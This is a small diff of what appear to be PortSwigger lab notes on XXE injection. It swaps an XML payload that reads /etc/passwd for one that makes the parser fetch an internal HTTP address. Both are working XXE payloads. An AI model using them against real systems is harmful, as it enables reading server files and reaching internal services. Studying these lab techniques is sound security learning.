@@ -4,9 +4,9 @@ Tags: #XXE #PortSwigger
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>      
+	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://168.254.168.254/">]>      
 	<root>
-		&myFile;
+		&xxe;
 	</root>
 
 	<!-- 
